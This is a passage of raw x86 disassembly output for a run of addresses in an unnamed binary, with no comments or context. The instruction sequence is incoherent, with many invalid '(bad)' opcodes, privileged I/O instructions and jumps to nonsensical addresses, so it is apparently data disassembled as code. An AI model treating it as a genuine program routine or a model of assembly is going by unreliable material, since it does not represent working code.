  41120e:	or     dh,ch
  411210:	pusha  
  411211:	jge    0x41121d
  411213:	scas   al,BYTE PTR es:[edi]
  411214:	out    dx,eax
  411215:	or     ecx,DWORD PTR [ebx+0x24d524ff]
  41121b:	or     al,0x67
  41121d:	pop    es
  41121e:	mov    ah,0xf2
  411220:	cmp    BYTE PTR [ebp+0x64fe70d1],bl
  411226:	lock and DWORD PTR [edx],edi
  411229:	lahf   
  41122a:	in     eax,0x14
  41122c:	jae    0x41121c
  41122e:	mov    ebx,0x1c3e783d
  411233:	dec    esi
  411234:	push   cs
  411235:	(bad)  
  411237:	jmp    0x52bf52f9
  41123c:	sahf   
  41123d:	pushf  
  41123e:	not    DWORD PTR [ebx]
  411240:	push   edx
  411241:	loope  0x411267
  411243:	pop    ebx
  411244:	dec    esp
  411245:	dec    esi
  411246:	aam    0xd5
  411248:	lds    eax,FWORD PTR [ebx+0x2b539e90]
  41124e:	loope  0x4112c1
  411250:	(bad)  
  411251:	repnz into 
  411253:	popf   
  411254:	mov    ebx,0x5386a5a8
  411259:	pop    edx
  41125a:	icebp  
  41125b:	outs   dx,BYTE PTR ds:[esi]
  41125c:	popf   
  41125d:	pop    ecx
  41125e:	scas   eax,DWORD PTR es:[edi]
  41125f:	sbb    eax,DWORD PTR [edx+0x32]
  411262:	data16 in al,dx
  411264:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411265:	pop    esp
  411266:	out    dx,eax
  411267:	jb     0x4111f1
  411269:	inc    esi
  41126a:	jbe    0x411246
  41126c:	mov    edx,DWORD PTR [eax+ebx*1]
  41126f:	fwait
  411270:	enter  0x79a7,0xc3
  411274:	jnp    0x411262
  411276:	inc    ebx
  411277:	fidiv  WORD PTR [edi-0x8b0efd2]
  41127d:	in     eax,dx
  41127e:	repz mov esi,0xa09ea99a
  411284:	jge    0xd026e38f
  41128a:	loop   0x411262
  41128c:	pop    esi
  41128d:	jecxz  0x4112aa
  41128f:	cli    
  411290:	icebp  
  411291:	leave  
  411292:	push   eax
  411293:	and    DWORD PTR [eax+ebx*1+0x55],esi
  411297:	inc    ebp
  411298:	cmp    al,0x67
  41129a:	mov    esp,0xff02cb20
  41129f:	mov    ah,0x32
  4112a1:	jg     0x411320
  4112a3:	nop
  4112a4:	jno    0x4112dd
  4112a6:	push   edi
  4112a7:	popf   
  4112a8:	inc    edi
  4112a9:	add    ebx,DWORD PTR [edi-0x66]
  4112ac:	xlat   BYTE PTR ds:[ebx]
  4112ad:	mov    cl,0xd9
  4112af:	imul   eax,DWORD PTR [eax-0x762c7307],0xffffffef
  4112b6:	repnz lds ebp,FWORD PTR [esi]
  4112b9:	in     eax,dx
  4112ba:	sti    
  4112bb:	cmp    ebp,DWORD PTR [esi+0x4807f2c2]
  4112c1:	push   0xca6c0c7f
  4112c6:	cli    
  4112c7:	sub    al,bl
  4112c9:	(bad)  
  4112ca:	sbb    BYTE PTR [edx],bh
  4112cc:	fisub  WORD PTR [si]
  4112cf:	mov    ah,0x5d
  4112d1:	dec    eax
  4112d2:	nop
  4112d3:	retf   0xe888
  4112d6:	jl     0x4112b3
  4112d8:	test   BYTE PTR ds:0x59e36356,bl
  4112de:	xor    DWORD PTR [eax],esp
  4112e0:	jmp    0x548c985a
  4112e5:	cdq    
  4112e6:	adc    DWORD PTR [edi+esi*2],0x79e09f0a
  4112ed:	pop    ss
  4112ee:	cs out dx,eax
  4112f0:	cli    
  4112f1:	arpl   WORD PTR [ecx-0x5f3d02bc],di
  4112f7:	int    0xa8
  4112f9:	lods   eax,DWORD PTR ds:[esi]
  4112fa:	adc    bh,dh
  4112fc:	fwait
  4112fd:	jmp    0xa75a:0x74fa5864
  411304:	loopne 0x411343
  411306:	add    BYTE PTR [edx+0x70],0xf3
  41130a:	ror    DWORD PTR [ebx+0x15],0x17
  41130e:	daa    
  41130f:	add    al,0x6b
  411311:	dec    edx
  411312:	cmp    al,0x1c
  411314:	fs pop es
  411316:	outs   dx,DWORD PTR ds:[esi]
  411317:	leave  
  411318:	dec    eax
  411319:	xchg   edi,eax
  41131a:	push   ebx
  41131b:	push   ds
  41131c:	das    
  41131d:	fisubr DWORD PTR [ebp+0x1e]
  411320:	sahf   
  411321:	ss push ebp
  411323:	inc    eax
  411324:	adc    ebp,DWORD PTR [edx+0xb4bd381]
  41132a:	xor    dl,0x5a
  41132d:	lds    esi,FWORD PTR [esp+ecx*8-0x6d]
  411331:	hlt    
  411332:	push   ds
  411333:	adc    DWORD PTR [ecx+ebp*2],ebx
  411336:	int3   
  411337:	push   edx
  411338:	lds    ecx,FWORD PTR [esi+0x2f]
  41133b:	and    ecx,0xffffffd0
  41133e:	div    DWORD PTR [ebx-0x41a500d1]
  411344:	xlat   BYTE PTR ds:[ebx]
  411345:	loopne 0x4112e3
  411347:	push   0x706106cf
  41134c:	xchg   esp,eax
  41134d:	jns    0x4112df
  41134f:	xor    BYTE PTR [eax],dl
  411351:	cmp    al,0xdf
  411353:	in     al,dx
  411354:	and    esp,DWORD PTR [edi+0x211ccc56]
  41135a:	xor    DWORD PTR [ecx],0xffffffd2
  41135d:	push   ecx
  41135e:	mov    ch,0xd0
  411360:	and    DWORD PTR [esi+0xeccb6ba],esi
  411366:	loop   0x4113da
  411368:	shr    DWORD PTR [edi+0x296f6877],cl
  41136e:	cmp    bl,BYTE PTR [edx+0x6ce7a644]
  411374:	loope  0x4113af
  411376:	popa   
  411377:	jne    0x41130a
  411379:	icebp  
  41137a:	mov    ebp,0x579f5a45
  41137f:	scas   al,BYTE PTR es:[edi]
  411380:	push   ebp
  411381:	arpl   WORD PTR [ecx-0x4488d07a],cx
  411387:	or     edx,ecx
  411389:	add    al,0x44
  41138b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41138c:	int    0x8f
  41138e:	mov    ds:0x19d43e1e,al
  411393:	(bad)  
  411394:	(bad)  
  411395:	mov    edi,0xf910e500
  41139a:	and    eax,0x663860cb
  41139f:	stos   DWORD PTR es:[edi],eax
  4113a0:	dec    ebp
  4113a1:	arpl   WORD PTR [ebx*1+0x1e77a910],bp
  4113a8:	addr16 jne 0x4113eb
  4113ab:	pusha  
  4113ac:	out    0xbc,al
  4113ae:	sbb    DWORD PTR [eiz*1+0x71826246],ecx
  4113b5:	inc    eax
  4113b6:	cmp    DWORD PTR [esi+0x77994b0a],edx
  4113bc:	inc    edx
  4113bd:	out    0xce,al
  4113bf:	xor    eax,0xa68abe67
  4113c4:	in     al,dx
  4113c5:	inc    eax
  4113c6:	dec    esi
  4113c7:	clc    
  4113c8:	(bad)  [ecx-0x80]
  4113cb:	xchg   ebp,eax
  4113cc:	test   BYTE PTR [edx-0x72],ch
  4113cf:	rol    DWORD PTR [edi+eiz*1+0x1e],1
  4113d3:	and    al,0xf6
  4113d5:	out    0x38,al
  4113d7:	sahf   
  4113d8:	scas   al,BYTE PTR es:[edi]
  4113d9:	test   eax,0x2e6af195
  4113de:	inc    cl
  4113e0:	mov    ebx,0xa475b38d
  4113e5:	sbb    esp,DWORD PTR [ebx+0x23]
  4113e8:	and    DWORD PTR [ebx+0x74],0xffffffc3
  4113ec:	shl    DWORD PTR ds:0xd79e2868,0xc
  4113f3:	pop    eax
  4113f4:	frstor [eax-0x28]
  4113f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113f8:	jge    0x4113c3
  4113fa:	loop   0x411473
  4113fc:	fidiv  WORD PTR [esi]
  4113fe:	es dec ecx
  411400:	dec    esp
  411401:	inc    esi
  411402:	sbb    eax,0xc2734364
  411407:	pop    ebx
  411408:	jno    0x4113ba
  41140a:	mov    BYTE PTR [ecx],dh
  41140c:	neg    BYTE PTR [eax]
  41140e:	mov    eax,ds:0x3f538d33
  411413:	cvttps2pi mm0,QWORD PTR [esp+edi*1-0x8]
  411418:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411419:	stos   BYTE PTR es:[edi],al
  41141a:	cli    
  41141b:	push   ebx
  41141c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41141d:	test   BYTE PTR [ebx+0x884540e],bh
  411423:	out    dx,eax
  411424:	(bad)  
  411426:	xchg   DWORD PTR [edi+0x7d66185e],esp
  41142c:	fwait
  41142d:	(bad)  
  41142e:	hlt    
  41142f:	mov    al,0x4d
  411431:	dec    ebx
  411432:	(bad)  
  411433:	xchg   ebp,eax
  411434:	enter  0xce03,0xde
  411438:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411439:	xchg   edx,eax
  41143a:	jle    0x4114b1
  41143c:	repnz int3 
  41143e:	fldcw  WORD PTR [esi]
  411440:	mov    al,ds:0x1c916e46
  411445:	cmp    dl,BYTE PTR [ecx]
  411447:	sbb    ah,cl
  411449:	pop    esp
  41144b:	loop   0x4113f9
  41144d:	or     al,0x55
  41144f:	popa   
  411450:	push   0x47
  411452:	enter  0x6b46,0xbc
  411456:	add    BYTE PTR [eax],0x68
  411459:	push   eax
  41145a:	fs or  al,0xe7
  41145d:	mov    bh,0xcd
  41145f:	das    
  411460:	ss loope 0x4113e6
  411463:	pop    eax
  411464:	xchg   ebp,eax
  411465:	mov    al,0x75
  411467:	test   DWORD PTR [esi+0x777eb01a],esi
  41146d:	enter  0x7176,0x4
  411471:	mov    ah,0x93
  411473:	cmp    ch,BYTE PTR [edi]
  411475:	scas   al,BYTE PTR es:[edi]
  411476:	inc    dx
  411478:	add    DWORD PTR [esi-0x5b4add6d],esi
  41147e:	mov    al,BYTE PTR [ebx+0x55]
  411481:	sbb    DWORD PTR [eax],esp
  411483:	cli    
  411484:	popf   
  411485:	aaa    
  411486:	mov    edx,0xf82b69de
  41148b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41148c:	sbb    eax,0x87bb3c43
  411491:	inc    esi
  411492:	sub    edi,edi
  411494:	jnp    0x4114d7
  411496:	jbe    0x411458
  411498:	into   
  411499:	and    bl,cl
  41149b:	repz sbb cl,dl
  41149e:	xor    BYTE PTR [ebp+0x68],ch
  4114a1:	cwde   
  4114a2:	stos   BYTE PTR es:[edi],al
  4114a3:	add    DWORD PTR [ebx+0x7f],esp
  4114a6:	iret   
  4114a7:	adc    ebp,DWORD PTR [esi]
  4114a9:	outs   dx,DWORD PTR ds:[esi]
  4114aa:	xchg   ebp,eax
  4114ab:	inc    edi
  4114ac:	cs test cl,bh
  4114af:	stc    
  4114b0:	outs   dx,DWORD PTR ds:[esi]
  4114b1:	mov    dl,0x86
  4114b3:	adc    dh,0xe4
  4114b6:	mov    WORD PTR [eax-0x6f93aad3],ds
  4114bc:	sbb    BYTE PTR [ecx+0x401603d1],dh
  4114c2:	bound  esi,QWORD PTR [ebx+0x29430d6b]
  4114c8:	xor    DWORD PTR ds:0x26300e40,0xdad44180
  4114d2:	jle    0x4114c6
  4114d4:	cld    
  4114d5:	pop    edx
  4114d6:	jbe    0x4114d0
  4114d8:	and    DWORD PTR [ebx+0x6e],edi
  4114db:	add    BYTE PTR [ebp-0x4fe2a324],ch
  4114e1:	stos   DWORD PTR es:[edi],eax
  4114e2:	fadd   QWORD PTR [eax-0xd]
  4114e5:	push   esi
  4114e6:	or     DWORD PTR [edi],ebx
  4114e8:	retf   0x4ddf
  4114eb:	ret    0xa0c1
  4114ee:	jnp    0x411503
  4114f0:	add    al,0xc9
  4114f2:	(bad)  
  4114f4:	fwait
  4114f5:	push   ecx
  4114f6:	mov    eax,ds:0xf2a7bfc7
  4114fb:	jbe    0x411564
  4114fd:	scas   eax,DWORD PTR es:[edi]
  4114fe:	push   esp
  4114ff:	das    
  411500:	xchg   edi,eax
  411501:	nop
  411502:	adc    al,0xa6
  411504:	in     al,0x78
  411506:	adc    edx,0x3e
  411509:	adc    bl,ch
  41150b:	sar    BYTE PTR [edi+0x13fa17c8],0x53
  411512:	xchg   edi,eax
  411513:	out    dx,eax
  411514:	or     cl,BYTE PTR [esi+0x52bed817]
  41151a:	add    eax,0x120805df
  41151f:	push   edx
  411520:	add    edi,DWORD PTR [esi]
  411522:	push   ds
  411523:	cmc    
  411524:	add    edx,ebp
  411526:	jne    0x411505
  411528:	mov    eax,ds:0x7f8cba70
  41152d:	repnz rol DWORD PTR [esi+0x4b9ae811],cl
  411534:	out    dx,al
  411535:	xchg   ecx,eax
  411536:	fs gs sub eax,0xa5a10b43
  41153d:	xchg   edi,eax
  41153e:	mov    ds:0xd165da85,al
  411543:	adc    edx,esi
  411545:	or     ch,cl
  411547:	loop   0x4115c4
  411549:	leave  
  41154a:	nop
  41154b:	ret    0x876e
  41154e:	shl    DWORD PTR [esp+esi*2+0x4],cl
  411552:	pop    esi
  411553:	sub    DWORD PTR [ebp+0x780efbb2],0x3c
  41155a:	enter  0xfe4,0x56
  41155e:	arpl   WORD PTR [ecx-0x4251376f],ax
  411564:	xor    eax,0x453169c
  411569:	pop    edi
  41156a:	push   ebx
  41156b:	add    BYTE PTR [ecx+0x390b8542],dl
  411571:	fisub  WORD PTR fs:[eax+edx*4]
  411575:	int3   
  411576:	dec    ebp
  411577:	mov    ah,bh
  411579:	jl     0x4115f2
  41157b:	add    dh,BYTE PTR [esi+0x7fedb24b]
  411581:	push   ebp
  411582:	push   es
  411583:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411584:	fisttp QWORD PTR [edi-0x72]
  411587:	push   esi
  411588:	ret    0xd294
  41158b:	nop
  41158c:	jmp    0xc0b6:0x6566febc
  411593:	gs out dx,eax
  411595:	or     al,0xd0
  411597:	out    dx,al
  411598:	inc    edx
  411599:	imul   edx,DWORD PTR [edi],0x77
  41159c:	sti    
  41159d:	jp     0x41156d
  41159f:	call   0xf012889d
  4115a4:	outs   dx,DWORD PTR fs:[esi]
  4115a6:	rcr    BYTE PTR [esi+0x3955a348],cl
  4115ac:	mov    al,0x45
  4115ae:	and    DWORD PTR [esi],esi
  4115b0:	xor    al,0x73
  4115b2:	dec    esp
  4115b3:	sbb    BYTE PTR [edi],al
  4115b5:	cld    
  4115b6:	add    edx,ebp
  4115b8:	xchg   esp,eax
  4115b9:	sbb    bh,ah
  4115bb:	das    
  4115bc:	nop
  4115bd:	cli    
  4115be:	int3   
  4115bf:	mov    dl,cl
  4115c1:	es jb  0x4115d1
  4115c4:	nop
  4115c5:	out    0xf9,al
  4115c7:	jo     0x411570
  4115c9:	mov    bh,BYTE PTR [edx]
  4115cb:	stc    
  4115cc:	outs   dx,BYTE PTR ds:[esi]
  4115cd:	test   DWORD PTR ds:0x9461563,0x26e3d403
  4115d7:	xor    edi,DWORD PTR [ebp+0x38b1ad3]
  4115dd:	xor    edx,DWORD PTR [ecx]
  4115df:	mov    edi,eax
  4115e1:	dec    edi
  4115e2:	fs icebp 
  4115e4:	push   ss
  4115e5:	or     al,0xbe
  4115e7:	cmp    DWORD PTR [eax-0x1276e05d],esp
  4115ed:	neg    DWORD PTR [edx-0x726728ef]
  4115f3:	sbb    bh,cl
  4115f5:	stos   BYTE PTR es:[edi],al
  4115f6:	mov    ebx,0x50233918
  4115fb:	add    al,0xee
  4115fd:	cli    
  4115fe:	addr16 xor eax,0xa3262eb8
  411604:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411605:	pop    eax
  411606:	inc    edx
  411607:	popa   
  411608:	or     eax,0x382d6b05
  41160d:	push   ds
  41160e:	jbe    0x41165a
  411610:	dec    eax
  411611:	sbb    bh,dh
  411613:	in     eax,0x59
  411615:	add    edx,DWORD PTR [ebx-0x74]
  411618:	push   0x768c8c99
  41161d:	jmp    0x41163e
  41161f:	ins    BYTE PTR es:[edi],dx
  411620:	dec    eax
  411621:	fadd   QWORD PTR [esi+0x153b632a]
  411627:	push   ebp
  411628:	xchg   edx,eax
  411629:	jp     0x411661
  41162b:	repz pop es
  41162d:	mov    bl,0x74
  41162f:	jmp    0x1190:0x68e6b5d
  411636:	adc    esi,ebx
  411638:	pop    edx
  411639:	mov    ds:0x64b7d92c,eax
  41163e:	(bad)  
  41163f:	lock repnz push 0x30367aec
  411646:	xchg   esp,eax
  411647:	and    DWORD PTR [ebx],esi
  411649:	cmp    eax,DWORD PTR [ebx+esi*2+0x502d100a]
  411650:	fdivr  DWORD PTR [eax+0x4]
  411653:	ficomp WORD PTR [ebp-0x2dcffa22]
  411659:	mov    dl,0xb8
  41165b:	mov    al,0xbe
  41165d:	cli    
  41165e:	call   0xfb17:0x3458442d
  411665:	popa   
  411666:	push   cs
  411667:	dec    ebx
  411668:	dec    BYTE PTR [eax-0x26270c5]
  41166e:	sbb    al,0x80
  411670:	push   ss
  411671:	cmp    eax,0x88b7d7fc
  411676:	inc    esp
  411677:	mov    dh,BYTE PTR [edx+0x429cad3e]
  41167d:	push   eax
  41167e:	imul   esp,DWORD PTR [ebp-0x34],0xf82f1633
  411685:	pop    esi
  411686:	push   es
  411687:	test   BYTE PTR [ecx],ch
  411689:	pop    ebp
  41168a:	jo     0x411684
  41168c:	add    esi,eax
  41168e:	shr    BYTE PTR [ebx],0xb7
  411691:	je     0x41162e
  411693:	sbb    eax,0x87680399
  411698:	mov    cl,0x5e
  41169a:	cmp    dl,al
  41169c:	bound  ebx,QWORD PTR [eax+0x1a7f7289]
  4116a2:	loop   0x411710
  4116a4:	add    ch,BYTE PTR [ebp+0x2b65d71b]
  4116aa:	sub    ebp,DWORD PTR [ebp-0x2399e2b7]
  4116b0:	fld    QWORD PTR [esi-0x22fcd916]
  4116b6:	popf   
  4116b7:	or     bh,BYTE PTR [ecx-0x7b]
  4116ba:	shr    DWORD PTR [ecx+edx*2],0xc1
  4116be:	popf   
  4116bf:	sub    DWORD PTR [esi+edx*2-0x2154a88f],esi
  4116c6:	sar    BYTE PTR [bx+di],0xeb
  4116ca:	sub    al,0x3c
  4116cc:	(bad)  
  4116cd:	mov    eax,0x6c8fda0b
  4116d2:	xor    edx,DWORD PTR [ebx+0x79ea748a]
  4116d8:	or     BYTE PTR [edx+0x67cfbd13],bl
  4116de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116e0:	imul   ebp,DWORD PTR [ecx],0xffffff86
  4116e3:	pop    ecx
  4116e4:	arpl   WORD PTR [ebx+0x31],bp
  4116e7:	xchg   esp,eax
  4116e8:	das    
  4116e9:	mov    esi,fs
  4116eb:	add    BYTE PTR [ecx+0x5676c735],bl
  4116f1:	jle    0x4116aa
  4116f3:	je     0x41172a
  4116f5:	cmp    edi,DWORD PTR [esi]
  4116f7:	sub    eax,DWORD PTR ds:0x34d5a313
  4116fd:	es inc edx
  4116ff:	fistp  WORD PTR [eax-0x6512d13a]
  411705:	sbb    al,0x3e
  411707:	push   edi
  411708:	rcl    BYTE PTR [ebp-0x9],cl
  41170b:	pop    ebx
  41170c:	add    DWORD PTR [edx],ecx
  41170e:	imul   edi,DWORD PTR [esi+0x56],0x9a5818f0
  411715:	data16 or al,0x9a
  411718:	fwait
  411719:	sti    
  41171a:	ret    0xa92d
  41171d:	jnp    0x411797
  41171f:	mov    ah,0xf8
  411721:	xor    ch,BYTE PTR ds:0x8fe72756
  411727:	pop    esi
  411728:	mov    cl,0x5e
  41172a:	adc    BYTE PTR [edx-0x63],ah
  41172d:	adc    bh,ch
  41172f:	inc    ebp
  411731:	icebp  
  411732:	call   0x9034:0x920bb275
  411739:	jmp    0xbd8:0x21f25761
  411740:	xchg   ch,bh
  411742:	push   0xffffffac
  411744:	inc    edx
  411745:	jb     0x411747
  411747:	lock mov cl,0xb9
  41174a:	and    DWORD PTR [edi],esi
  41174c:	arpl   WORD PTR [eax+0x7b],bx
  41174f:	add    al,0x4c
  411751:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  411753:	loope  0x411701
  411755:	fwait
  411756:	and    DWORD PTR [edi+0x5],edx
  411759:	mov    ecx,0x24af2fb2
  41175e:	or     BYTE PTR ds:0x7c4b606f,0xd0
  411765:	push   eax
  411766:	xchg   ebx,eax
  411767:	xlat   BYTE PTR ds:[ebx]
  411768:	or     eax,DWORD PTR [esi]
  41176a:	sbb    DWORD PTR [ecx+0x1e],esi
  41176d:	lods   eax,DWORD PTR ds:[esi]
  41176e:	xor    BYTE PTR [edi],ah
  411770:	sbb    DWORD PTR [ebp-0x3d],eax
  411773:	sub    ch,bl
  411775:	mov    cl,0x51
  411777:	mov    WORD PTR [edi+0x2cd6b5b8],gs
  41177d:	popa   
  41177e:	xchg   esi,eax
  41177f:	push   edx
  411780:	pop    esi
  411781:	or     DWORD PTR [ebx-0x7],edx
  411784:	and    DWORD PTR [ebp-0xf4e2979],edi
  41178a:	dec    edx
  41178b:	adc    al,0x99
  41178d:	out    0xa7,eax
  41178f:	fcmovnu st,st(5)
  411791:	addr16 mov al,ds:0x36d1
  411795:	and    eax,0x97edd2b3
  41179a:	stos   DWORD PTR es:[edi],eax
  41179b:	stc    
  41179c:	ret    
  41179d:	mov    al,0x4f
  41179f:	mov    edi,0x2a144a5b
  4117a4:	std    
  4117a5:	test   al,0x5b
  4117a7:	clc    
  4117a8:	and    al,0x4e
  4117aa:	add    bl,BYTE PTR [esi-0x1d]
  4117ad:	dec    ebp
  4117ae:	fist   DWORD PTR [ebx]
  4117b0:	ss dec esp
  4117b2:	daa    
  4117b3:	addr16 mov bl,0x50
  4117b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117b7:	call   0x7c39:0xf77098ce
  4117be:	mov    dl,0x41
  4117c0:	mov    edi,0xc5ccdcbb
  4117c5:	dec    ebx
  4117c6:	sahf   
  4117c7:	test   DWORD PTR [esi+ebp*1],0x93777cb8
  4117ce:	mov    cl,BYTE PTR [ebp-0x21]
  4117d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117d2:	dec    ecx
  4117d3:	xchg   esi,eax
  4117d4:	je     0x411779
  4117d6:	mov    cl,0x1f
  4117d8:	jmp    0x411798
  4117da:	mov    edx,0x34bca936
  4117df:	shr    BYTE PTR [esi],0xc
  4117e2:	mov    BYTE PTR [esi-0x61f1dece],0x4d
  4117e9:	cmp    BYTE PTR [ebp*1-0x637a488f],bh
  4117f0:	test   DWORD PTR [edx+ebx*4+0x73],edi
  4117f4:	add    al,0x85
  4117f6:	lods   al,BYTE PTR ds:[esi]
  4117f7:	mov    al,0x50
  4117f9:	aam    0x6a
  4117fb:	ds mov bh,0xcc
  4117fe:	and    eax,0x36c6047a
  411803:	jnp    0x4117c9
  411805:	xchg   ebp,eax
  411806:	mov    ds,WORD PTR ds:0x7cdd7466
  41180c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41180d:	mov    ds:0xd72547e5,eax
  411812:	pop    ds
  411813:	les    edi,FWORD PTR [edi]
  411815:	cmp    dl,BYTE PTR [esi]
  411817:	and    bl,BYTE PTR [edx-0x26b324b2]
  41181d:	inc    edi
  41181e:	inc    edx
  41181f:	sub    al,0x8c
  411821:	je     0x4117b2
  411823:	pop    esi
  411824:	div    ebx
  411826:	adc    BYTE PTR [ecx-0x7d],dl
  411829:	mov    BYTE PTR [esp+eiz*4+0x4353dadf],dl
  411830:	push   0x38fe06bd
  411835:	fsub   st(5),st
  411837:	jl     0x41180f
  411839:	mov    edx,0x3d8c7fcc
  41183e:	mov    esp,0xbd8c0fe3
  411843:	sbb    eax,0xf1014b64
  411848:	call   0x1fbe:0xe076fd41
  41184f:	jg     0x4117da
  411851:	xchg   esp,eax
  411852:	inc    ebp
  411853:	pop    ecx
  411854:	and    al,0x6c
  411856:	jae    0x41183b
  411858:	sub    BYTE PTR [edx],0x35
  41185b:	push   0x58f79847
  411860:	xor    dl,BYTE PTR [edx+ebx*1+0x6b]
  411864:	in     eax,0xb2
  411866:	retf   0xb6fd
  411869:	imul   ebx,ecx,0x52
  41186c:	retf   0xb25
  41186f:	int3   
  411870:	cmp    DWORD PTR [eax+0x20c6109],edx
  411876:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411877:	jmp    0x273bdb52
  41187c:	and    al,0xa8
  41187e:	xchg   esi,eax
  41187f:	inc    ebx
  411880:	stos   BYTE PTR es:[edi],al
  411881:	push   edx
  411882:	fcomip st,st(0)
  411884:	div    BYTE PTR [esi-0x39]
  411887:	ficomp WORD PTR [eax+0x2b]
  41188a:	inc    eax
  41188b:	adc    eax,0x9d12075
  411890:	test   eax,0xb8b6365a
  411895:	daa    
  411896:	push   edi
  411897:	mov    bh,0xfe
  41189a:	dec    ebp
  41189b:	mov    esp,0x446a0911
  4118a0:	shl    BYTE PTR [ecx+0x4b58d13d],0x72
  4118a7:	loop   0x41188f
  4118a9:	jbe    0xd585ed2f
  4118af:	call   FWORD PTR [edx-0x1dfe643f]
  4118b5:	test   BYTE PTR [ecx],ch
  4118b7:	(bad)  
  4118b8:	div    ch
  4118ba:	sbb    dh,BYTE PTR [ecx]
  4118bc:	or     eax,0xd775c3cb
  4118c1:	pop    ds
  4118c2:	sub    al,bl
  4118c4:	jnp    0x41193e
  4118c6:	lock mov WORD PTR [ebp+ebp*8+0x8],ds
  4118cb:	xchg   edi,eax
  4118cc:	dec    ebp
  4118cd:	sbb    al,0xf3
  4118cf:	add    BYTE PTR cs:[ebp+ebx*1+0x2b],bh
  4118d4:	test   edx,0xfffee6
  4118da:	lds    esp,FWORD PTR [ebx]
  4118dc:	adc    al,BYTE PTR [ebx]
  4118de:	fsubp  st(4),st
  4118e1:	out    dx,al
  4118e2:	dec    ebx
  4118e3:	test   al,0x6a
  4118e5:	cld    
  4118e6:	dec    esp
  4118e7:	adc    BYTE PTR [ebx],ah
  4118e9:	test   BYTE PTR [esi+edi*2-0x4279d82],bh
  4118f0:	shl    DWORD PTR [edi-0x288dde47],0xe9
  4118f7:	jmp    0x31005dc7
  4118fc:	mov    eax,ds:0x148f5216
  411901:	daa    
  411902:	cmp    BYTE PTR ds:0xc92ad48a,dl
  411908:	hlt    
  411909:	repz xchg ebx,eax
  41190b:	dec    ecx
  41190c:	and    BYTE PTR [edx],0x61
  41190f:	test   al,0xa0
  411911:	rol    DWORD PTR [ebx],cl
  411913:	rcr    BYTE PTR [eax],0x73
  411916:	pop    ds
  411917:	mov    DWORD PTR [esi],edx
  411919:	xchg   ebx,eax
  41191a:	loopne 0x4118db
  41191c:	fndisi(8087 only) 
  41191e:	xchg   edi,eax
  41191f:	rcr    BYTE PTR [edx],0xcf
  411922:	inc    ecx
  411923:	das    
  411924:	lea    ecx,[ecx]
  411926:	or     bl,dh
  411928:	scas   al,BYTE PTR es:[edi]
  411929:	cdq    
  41192a:	push   esp
  41192b:	enter  0x95e7,0x25
  41192f:	leave  
  411930:	stc    
  411931:	stos   DWORD PTR es:[edi],eax
  411932:	jp     0x41199d
  411934:	push   ss
  411935:	dec    esi
  411936:	push   esi
  411937:	pusha  
  411938:	addr16 pop ss
  41193a:	int    0x72
  41193c:	and    BYTE PTR [ecx+edi*8+0x42],cl
  411940:	pop    ebp
  411941:	and    BYTE PTR [ebx],bh
  411943:	jbe    0x411951
  411945:	(bad)  
  411946:	and    DWORD PTR [ecx+esi*4],esi
  411949:	fldcw  WORD PTR [ebx+ecx*4+0x43]
  41194d:	int    0x5b
  41194f:	test   BYTE PTR [eax],cl
  411951:	cld    
  411952:	stos   BYTE PTR es:[edi],al
  411953:	mov    bl,0x54
  411955:	pop    es
  411956:	out    0x4c,al
  411958:	dec    ebp
  411959:	mov    al,0xf3
  41195b:	stos   DWORD PTR es:[edi],eax
  41195c:	repz and edx,DWORD PTR [edx+ecx*2+0x71]
  411961:	mov    gs,WORD PTR [ecx]
  411963:	pop    esp
  411964:	in     al,dx
  411965:	cmp    ch,BYTE PTR [eax]
  411967:	sub    al,0xbb
  411969:	outs   dx,BYTE PTR ds:[esi]
  41196a:	dec    edx
  41196b:	add    BYTE PTR [edi+0x41bd6cd0],ah
  411971:	cmp    eax,0x7dd4e573
  411976:	jnp    0x411952
  411978:	xor    BYTE PTR [edx+0x8cefab5],bh
  41197e:	cmp    cl,BYTE PTR es:[ecx+0xb]
  411982:	adc    edx,ecx
  411984:	aas    
  411985:	mov    eax,0x79696fb5
  41198a:	ror    esp,0x5
  41198d:	addr16 xor eax,0xc87cd0bf
  411993:	sub    ebx,esi
  411995:	jae    0x4119c3
  411997:	or     BYTE PTR [edi],ah
  411999:	adc    eax,0x5f437d99
  41199e:	enter  0x6c8e,0x9d
  4119a2:	stc    
  4119a3:	test   eax,0x7d8bcd2d
  4119a8:	ret    0x9234
  4119ab:	popf   
  4119ac:	add    DWORD PTR [ebx+eax*1],edx
  4119af:	add    BYTE PTR [esi],bh
  4119b1:	out    dx,eax
  4119b2:	push   eax
  4119b3:	xchg   ecx,eax
  4119b4:	sub    dh,BYTE PTR [eax-0x19]
  4119b7:	retf   0x74e5
  4119ba:	cmp    eax,0xf21fe927
  4119bf:	mov    eax,ds:0x4db96b48
  4119c4:	popf   
  4119c5:	pop    esi
  4119c6:	data16 (bad) 
  4119c8:	mov    ds:0x7234c22,al
  4119cd:	cdq    
  4119ce:	je     0x411a48
  4119d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119d1:	xchg   BYTE PTR [ebp-0x349ad634],dh
  4119d7:	cmp    DWORD PTR [edi+ebp*2],edx
  4119da:	leave  
  4119db:	mov    bl,0xe
  4119dd:	inc    edx
  4119de:	fwait
  4119df:	xchg   DWORD PTR [ebx],esi
  4119e1:	sbb    eax,0x88a0fdf4
  4119e6:	xchg   ecx,eax
  4119e7:	imul   al
  4119e9:	mov    edi,0x20809506
  4119ee:	mov    ebp,0xa2716373
  4119f3:	(bad)  
  4119f4:	fcmovnbe st,st(1)
  4119f6:	or     esi,DWORD PTR [eax+0x5a51264a]
  4119fc:	arpl   WORD PTR [esi-0x6b],dx
  4119ff:	dec    dh
  411a01:	(bad)  
